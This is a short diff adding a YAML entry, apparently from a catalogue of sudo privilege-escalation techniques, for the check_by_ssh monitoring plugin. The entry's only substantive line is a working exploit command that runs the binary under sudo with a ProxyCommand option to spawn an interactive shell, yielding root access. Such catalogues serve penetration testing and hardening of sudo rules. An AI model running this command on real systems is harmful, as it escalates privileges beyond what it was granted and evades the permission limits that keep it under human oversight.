@@ -1,0 +1,5 @@
+name: check_by_ssh
+binary_path: /usr/bin/check_by_ssh
+exploit_cmds:
+- sudo /usr/bin/check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H
+  localhost -C x
